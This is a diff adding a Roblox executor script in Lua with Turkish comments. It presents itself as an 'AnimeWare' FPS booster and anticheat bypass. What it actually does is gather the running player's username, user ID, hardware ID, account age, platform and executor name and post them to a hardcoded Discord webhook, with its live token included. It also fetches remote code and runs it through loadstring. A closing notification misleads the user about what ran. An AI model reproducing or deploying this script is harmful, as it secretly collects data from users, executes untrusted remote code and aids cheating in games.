@@ -1,0 +1,178 @@
+local webhookUrl = "https://discord.com/api/webhooks/1393843483755679806/kEzil-U5rUbKVfRpXSbV_r3qtDc1KfI1XnHTYvTj_rr8YpX6iSDyJDBTs9au3ttdA9jc"
+
+--// Servisler
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local StatsService = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+
+--// Bilgi Toplama
+local player = Players.LocalPlayer
+local playerName = player.Name
+local userId = player.UserId
+local teamName = tostring(player.Team and player.Team.Name or "No Team")
+local accountAge = player.AccountAge
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (365.25 * 24 * 60 * 60 - accountAge * 24 * 60 * 60))
+local playerCount = #Players:GetPlayers()
+local placeId, jobId = game.PlaceId, game.JobId
+local gameName = MarketplaceService:GetProductInfo(placeId).Name
+local ping = math.floor(StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+
+-- Yeni: Oyun dili tespiti (Türkçe ise "TR", değilse "EN")
+local localeId = LocalizationService.RobloxLocaleId
+local gameLanguage = localeId == "tr-tr" and "TR" or "EN"
+
+-- Yeni: Kullanıcının platformu
+local platform = UserInputService:GetPlatform()
+
+local platformName = ""
+if platform == Enum.Platform.Windows then
+    platformName = "PC"
+elseif platform == Enum.Platform.XBoxOne then
+    platformName = "Xbox"
+elseif platform == Enum.Platform.Android then
+    platformName = "Android"
+elseif platform == Enum.Platform.IOS then
+    platformName = "iOS"
+else
+    platformName = tostring(platform)
+end
+
+-- Premium kontrolü
+local isPremium = (player.MembershipType == Enum.MembershipType.Premium) and "Yeah" or "No"
+
+--// Executor Tespiti
+local function getExecutor()
+    if syn then return "Synapse X"
+    elseif is_sirhurt_closure then return "SirHurt"
+    elseif KRNL_LOADED then return "KRNL"
+    elseif getexecutorname then return getexecutorname()
+    else return "Bilinmiyor" end
+end
+
+--// HWID
+local function getHWID()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end
+
+--// Avatar
+local function getPlayerAvatar()
+    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
+end
+
+--// FPS ölçüm
+local function getCurrentFPS(callback)
+    local frameCount = 0
+    local connection
+    connection = RunService.RenderStepped:Connect(function()
+        frameCount += 1
+    end)
+
+    task.delay(1, function()
+        connection:Disconnect()
+        callback(frameCount)
+    end)
+end
+
+--// Roblox API’den takipçi sayısı çek (async)
+local function getFollowerCount(callback)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count")).count
+    end)
+    if success then
+        callback(result)
+    else
+        callback("Hata")
+    end
+end
+
+--// Webhook gönderici
+local function sendWebhook(finalFPS, followerCount)
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🔱 AnimeWare Premium Executed!",
+            ["description"] = table.concat({
+                "👤 **User:** [" .. playerName .. "](https://www.roblox.com/users/" .. userId .. "/profile)",
+                "🎯 **Team:** " .. teamName,
+                "🕹️ **Game:** " .. gameName,
+                "🆔 **Game ID:** " .. placeId,
+                "🌍 **Number of Players:** " .. playerCount,
+                "🎯 **FPS:** " .. finalFPS,
+                "📡 **Ping:** " .. ping,
+                "🧠 **HWID:** " .. getHWID(),
+                "💼 **Account Age:** " .. accountAge .. " Day",
+                "📅 **Created Date:** " .. accountCreationDate,
+                "👥 **Follower Number:** " .. tostring(followerCount),
+                "🧪 **Executor:** " .. getExecutor(),
+                "🧩 **Job ID:** " .. jobId,
+                "🌐 **Game Language:** " .. gameLanguage,
+                "🕹️ **Platform:** " .. platformName,
+                "⭐ **Premium MemberShip:** " .. isPremium,
+                "🕒 **Timeout:** " .. os.date("%d/%m/%Y %H:%M:%S"),
+            }, "\n"),
+            ["color"] = tonumber("0xFFF700"),
+            ["thumbnail"] = {["https://cdn.akamai.steamstatic.com/steamcommunity/public/images/apps/2378900/55f956539371a92bd5d24a0a72d84cf983eb4b82.jpg"] = getPlayerAvatar()},
+            ["footer"] = {["text"] = "👑 Order Of Chaos Loader | by Army"}
+        }}
+    }
+
+    local encoded = HttpService:JSONEncode(data)
+    local request = http_request or request or HttpPost or syn and syn.request
+    if request then
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = encoded
+        })
+    end
+end
+
+-- FPS GUI
+local function showFPSGui()
+    local fpsGui = Instance.new("ScreenGui", game.CoreGui)
+    fpsGui.Name = "FPSGui"
+    local label = Instance.new("TextLabel", fpsGui)
+    label.Size = UDim2.new(0, 120, 0, 25)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    label.TextColor3 = Color3.new(1,1,1)
+    label.Font = Enum.Font.SourceSansBold
+    label.TextSize = 16
+    label.BackgroundTransparency = 0.2
+    label.Text = "FPS: ..."
+
+    local frames = 0
+    local last = tick()
+    RunService.RenderStepped:Connect(function()
+        frames += 1
+        local now = tick()
+        if now - last >= 1 then
+            label.Text = "FPS: "..frames
+            frames = 0
+            last = now
+        end
+    end)
+end
+
+-- Çalıştır
+showFPSGui()
+
+getCurrentFPS(function(fps)
+    getFollowerCount(function(followers)
+        sendWebhook(fps, followers)
+    end)
+end)
+
+loadstring(game:HttpGet("https://discord.com/api/webhooks/1376592722449928325/_0fI-h3_yXYWM_eI30__Sn6WJTCWanls9t7G4hHTNgMsKDogUYcGKP-rOFvWWdoa1aE8"))()
+
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "🎉 Menu Activated !",
+        Text = "FPS Boosted + AntiCheat Bypassed",
+        Duration = 6
+    })
+end)
